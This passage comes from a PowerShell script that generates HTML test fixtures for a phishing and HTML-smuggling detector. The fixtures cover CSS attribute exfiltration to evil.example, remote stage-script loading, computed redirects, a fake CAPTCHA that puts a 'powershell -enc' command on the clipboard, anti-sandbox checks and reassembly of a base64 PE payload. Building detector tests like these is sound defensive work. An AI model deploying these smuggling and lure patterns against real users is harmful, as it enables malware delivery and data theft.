<input data-token="secret-token-123456" />
</body></html>
"@

# 23
Add-TestFile -List ([ref]$testFiles) -Name 'test23_css_import_external.html' -ExpectedScore '0-3' -ExpectedDetection 'YES' -ExpectedCoreReasons 'css_import_external' -Description 'Externer CSS Import' -Category 'CSS_EXFIL' -Content @"
<!DOCTYPE html>
<html><head>
<style>
@import url("https://evil.example/a.css");
body { font-family: Arial; }
</style>
</head>
<body>css import test</body></html>
"@

# 24
Add-TestFile -List ([ref]$testFiles) -Name 'test24_geo_targeting_api.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'geo_targeting_api,geo_location_api' -Description 'Geo API und Geolocation in einem Script' -Category 'GEO_TARGETING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
fetch('https://ipapi.co/json/');
navigator.geolocation.getCurrentPosition(function(pos) {
  console.log(pos.coords.latitude);
});
</script>
</body></html>
"@

# 25
Add-TestFile -List ([ref]$testFiles) -Name 'test25_timezone_targeting.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'timezone_targeting' -Description 'Timezone basierte Selektionslogik' -Category 'GEO_TARGETING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
var off = new Date().getTimezoneOffset();
if (tz === 'Europe/Zurich' || off === -60) {
  console.log('target matched');
}
</script>
</body></html>
"@

# 26
Add-TestFile -List ([ref]$testFiles) -Name 'test26_evasion_webdriver.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'antisandbox_webdriver' -Description 'Antisandbox ueber navigator.webdriver' -Category 'EVASION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
if (navigator.webdriver === true || ('webdriver' in navigator)) {
  console.log('sandbox detected');
}
</script>
</body></html>
"@

# 27
Add-TestFile -List ([ref]$testFiles) -Name 'test27_evasion_hardware_check.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'hardware_check_evasion' -Description 'Hardware Checks fuer kleine oder virtuelle Systeme' -Category 'EVASION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
if (navigator.hardwareConcurrency <= 2 || navigator.deviceMemory <= 4 || screen.width <= 800) {
  console.log('low resource environment');
}
</script>
</body></html>
"@

# 28
Add-TestFile -List ([ref]$testFiles) -Name 'test28_persistence_localstorage.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'localstorage_persistence' -Description 'LocalStorage Speicherung und Wiederverwendung' -Category 'PERSISTENCE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var current = localStorage.getItem('payload');
if (!current) {
  localStorage.setItem('payload', 'stage-1');
}
</script>
</body></html>
"@

# 29
Add-TestFile -List ([ref]$testFiles) -Name 'test29_persistence_sessionstorage.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'sessionstorage_persistence' -Description 'SessionStorage Persistenz' -Category 'PERSISTENCE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
sessionStorage.setItem('stage', '2');
console.log(sessionStorage.getItem('stage'));
</script>
</body></html>
"@

# 30
Add-TestFile -List ([ref]$testFiles) -Name 'test30_domain_rotation.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'domain_rotation' -Description 'Drei Domains und Redirect Logik' -Category 'DOMAIN_ROTATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var urls = [
  'https://a.example/path',
  'https://b.example/path',
  'https://c.example/path'
];
window.location = urls[2];
</script>
</body></html>
"@

# 31
Add-TestFile -List ([ref]$testFiles) -Name 'test31_computed_redirect.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'computed_redirect' -Description 'Redirect Ziel wird dynamisch zusammengesetzt' -Category 'DOMAIN_ROTATION' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var a = 'https://';
var b = 'evil.example/';
var c = 'stage';
window.location = a + b + c;
</script>
</body></html>
"@

# 32
Add-TestFile -List ([ref]$testFiles) -Name 'test32_clickfix_run_dialog.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'run_dialog_lure,powershell_lure or clickfix_lure' -Description 'Run Dialog und PowerShell Lure' -Category 'CLICKFIX' -Content @"
<!DOCTYPE html>
<html><body>
<div>Press Windows+R and open the Run Dialog.</div>
<div>Then paste this PowerShell command.</div>
<script>
console.log('windows+r powershell run dialog');
</script>
</body></html>
"@

# 33
Add-TestFile -List ([ref]$testFiles) -Name 'test33_fake_captcha_clipboard.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'fake_captcha_lure,clipboard_exec_lure,clickfix_lure' -Description 'Fake CAPTCHA mit Clipboard und Exec Kontext' -Category 'CLICKFIX' -Content @"
<!DOCTYPE html>
<html><body>
<h2>I am not a robot</h2>
<p>Copy this command from the clipboard and run PowerShell.</p>
<script>
navigator.clipboard.writeText('powershell -enc AAAA');
</script>
</body></html>
"@

# 34
Add-TestFile -List ([ref]$testFiles) -Name 'test34_push_abuse.html' -ExpectedScore '0-3' -ExpectedDetection 'YES' -ExpectedCoreReasons 'push_permission_request,push_serviceworker_combo,push_notification_flow' -Description 'Notification Permission plus Service Worker und PushManager' -Category 'PUSH_ABUSE' -Content @"
<!DOCTYPE html>
<html><body>
<script>
Notification.requestPermission().then(function() {
  navigator.serviceWorker.register('/sw.js').then(function(reg) {
    return reg.pushManager.subscribe({userVisibleOnly: true});
  });
});
</script>
</body></html>
"@

# 35
Add-TestFile -List ([ref]$testFiles) -Name 'test35_blockchain_staging.html' -ExpectedScore '2-6' -ExpectedDetection 'YES' -ExpectedCoreReasons 'web3_api_usage,ethers_contract_payload,blockchain_remote_stage or blockchain_staged_payload' -Description 'Web3 oder Ethers basierte Staging Logik' -Category 'BLOCKCHAIN_STAGING' -Content @"
<!DOCTYPE html>
<html><body>
<script>
var ethers = {};
ethers.Contract = function(address, abi, provider) { return { getPayload: function() { return 'payload'; } }; };
var provider = { call: function(o) { return Promise.resolve('data'); } };
var contract = new ethers.Contract('0x1234', [], provider);
provider.call({to: '0x1234', data: '0xdeadbeef'});
eval(atob('Y29uc29sZS5sb2coJ2Jsb2NrY2hhaW4nKQ=='));
</script>
</body></html>
"@

# 36
Add-TestFile -List ([ref]$testFiles) -Name 'test36_legitimate_negative.html' -ExpectedScore '0-1' -ExpectedDetection 'NO' -ExpectedCoreReasons 'none' -Description 'Legitime einfache Seite ohne verdaechtige APIs' -Category 'NEGATIVE' -Content @"
<!DOCTYPE html>
<html>
<head><title>Legitimate Site</title></head>
<body>
<h1>Welcome</h1>
<p>This is a normal page.</p>
<a href="https://example.org/help">Help</a>
</body>
</html>
"@

# 37
Add-TestFile -List ([ref]$testFiles) -Name 'test37_safe_external_negative.html' -ExpectedScore '0-2' -ExpectedDetection 'NO' -ExpectedCoreReasons 'none' -Description 'Externe Scripts ohne Smuggling Kontext' -Category 'NEGATIVE' -Content @"
<!DOCTYPE html>
<html><body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
<script>
console.log('normal script usage');
</script>
</body></html>
"@

# 38
Add-TestFile -List ([ref]$testFiles) -Name 'test38_html_keyword_newsletter_like.html' -ExpectedScore '0-2' -ExpectedDetection 'LOW_OR_NONE' -ExpectedCoreReasons 'html_keyword newsletter heuristic only' -Description 'Nur HTML Keyword, kein echter Header Newsletter Test' -Category 'NEWSLETTER_HTML_ONLY' -Content @"
<!DOCTYPE html>
<html><body>
<p>View in browser</p>
<p>Weekly customer update</p>
</body></html>
"@

# 39
Add-TestFile -List ([ref]$testFiles) -Name 'test39_all_in_one_capped.html' -ExpectedScore '10-15 internal capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'mehrere Klassen, intern gedeckelt' -Description 'Kombinierter Test fuer mehrere Module mit realistischer Cap Erwartung' -Category 'ALL_IN_ONE' -Content @"
<!DOCTYPE html>
<html><head>
<style>
body::before { content: "atob('$($PE_BASE64.Substring(0,120))')"; }
input[data-token] { background-image: url(https://evil.example/collect?d=attr(data-token)); }
</style>
</head>
<body>
<input data-token="secret-12345" />
<object data="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml"></object>
<script src="https://evil.example/stage.js"></script>
<script>
var parts = [
  "$($PE_BASE64.Substring(0,150))",
  "$($PE_BASE64.Substring(150,150))",
  "$($PE_BASE64.Substring(300,150))",
  "$($PE_BASE64.Substring(450))"
];
var payload = parts.join('');
setTimeout(function() {
  var decoded = atob(payload);
  var blob = new Blob([decoded], {type: 'application/octet-stream'});
  var url = URL.createObjectURL(blob);
  fetch(url).then(function(r) { return r.blob(); }).then(function(b) {
    var finalUrl = URL.createObjectURL(b);
    window.__all_url = finalUrl;
  });
}, 100);

if (navigator.webdriver === true) {
  console.log('webdriver');
}

Notification.requestPermission().then(function() {
  navigator.serviceWorker.register('/sw.js').then(function(reg) {
    return reg.pushManager.subscribe({userVisibleOnly: true});
  });
});
</script>
</body></html>
"@

# 40
Add-TestFile -List ([ref]$testFiles) -Name 'test40_svg_data_uri_pe_direct.html' -ExpectedScore '8-10 group capped' -ExpectedDetection 'YES' -ExpectedCoreReasons 'att_svg_data_uri,att_svg_script,att_svg_event_handler,dec_pe' -Description 'Direkter SVG Data URI Test fuer den eingebetteten SVG Extraktionspfad' -Category 'SVG_ACTIVE' -Content @"
<!DOCTYPE html>
<html><body>
<embed src="data:image/svg+xml;base64,$SVG_BASE64" type="image/svg+xml" />
</body></html>
"@

$successCount = 0
$errorCount = 0
$summary = @()

Write-Host ""
Write-Host "Generiere Testdateien..." -ForegroundColor Yellow
Write-Host ""

Push-Location -LiteralPath $outputRoot
try {
  foreach ($file in $testFiles) {
    try {
      $path = Join-Path -Path (Get-Location).Path -ChildPath $file.Name

      if ((Test-Path -LiteralPath $path) -and (-not $Force)) {
        Write-Host "Ueberspringe existierende Datei: $($file.Name) (nutze -Force)" -ForegroundColor Yellow
        continue
      }

      Write-Utf8NoBomFile -Path $path -Content $file.Content

      Write-Host "OK  $($file.Name)" -ForegroundColor Green
      Write-Host "   Score: $($file.ExpectedScore) | Detection: $($file.ExpectedDetection)" -ForegroundColor Gray
      Write-Host "   Core:  $($file.ExpectedCoreReasons)" -ForegroundColor DarkGray
      Write-Host "   $($file.Description)" -ForegroundColor DarkGray
      Write-Host ""

      $summary += [PSCustomObject]@{
        File = $file.Name
        Category = $file.Category
        ExpectedScore = $file.ExpectedScore
        ExpectedDetection = $file.ExpectedDetection
        ExpectedCoreReasons = $file.ExpectedCoreReasons
        Description = $file.Description
      }

      $successCount++
    }
    catch {
      Write-Host "Fehler bei $($file.Name): $($_.Exception.Message)" -ForegroundColor Red
      $errorCount++
    }
  }

  $csvPath = Join-Path -Path (Get-Location).Path -ChildPath 'test_manifest.csv'
  $jsonPath = Join-Path -Path (Get-Location).Path -ChildPath 'test_manifest.json'
  $readmePath = Join-Path -Path (Get-Location).Path -ChildPath 'README.txt'

  $summary | Export-Csv -LiteralPath $csvPath -NoTypeInformation -Encoding UTF8
  ($summary | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $jsonPath -Encoding UTF8

  $readme = @"
HTML Pattern Test Suite v4.4.2-r1

Diese Suite deckt absichtlich nur HTML und Script Muster ab.

Bewusst NICHT vollstaendig abgedeckt:
- echte MIME Attachment Dateinamen
- echte MIME Part Typen
- echte Newsletter Header
- trusted sender und maps
- image_smuggling_info als Part Dateiname
- OneNote, DOCM, XLSM, JS Attachments als echte Mailparts

Dafuer braucht es eine separate EML Suite.

Besonders wichtig:
- test13 und test40 sind nur sinnvoll, wenn die Erkennung fuer eingebettete SVG Data URIs vorhanden ist
- Score Erwartungen orientieren sich an v4.4.2-r1 Caps und nicht an alten 4.3.x Zahlen
"@
  Write-Utf8NoBomFile -Path $readmePath -Content $readme

  Write-Host ""
  Write-Host "╔══════════════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
  Write-Host "║                      HTML PATTERN SUITE ABGESCHLOSSEN                               ║" -ForegroundColor Cyan
  Write-Host "╠══════════════════════════════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
  Write-Host "║  Ordner: $outputRoot" -ForegroundColor White
  Write-Host "║  Erfolgreich: $successCount von $($testFiles.Count)" -ForegroundColor Green
  if ($errorCount -gt 0) {
    Write-Host "║  Fehler: $errorCount" -ForegroundColor Red
  }
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  Decode Gate Ziel: Base64 >= $MinDecodeBase64Chars Zeichen" -ForegroundColor Yellow
  Write-Host "║  Payload Byte Ziel: >= $TargetPayloadBytes Bytes" -ForegroundColor Yellow
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  Coverage:" -ForegroundColor Magenta
  Write-Host "║    JS_SMUGGLING, OBFUSCATION, WASM, PDF, SVG, CERT, CSS, GEO, EVASION" -ForegroundColor Gray
  Write-Host "║    PERSISTENCE, DOMAIN_ROTATION, CLICKFIX, PUSH_ABUSE, BLOCKCHAIN, NEGATIVE" -ForegroundColor Gray
  Write-Host "║" -ForegroundColor Cyan
  Write-Host "║  CSV Manifest:  $csvPath" -ForegroundColor Gray
  Write-Host "║  JSON Manifest: $jsonPath" -ForegroundColor Gray
  Write-Host "║  README:        $readmePath" -ForegroundColor Gray
  Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
  Write-Host ""
}
finally {
  Pop-Location
}
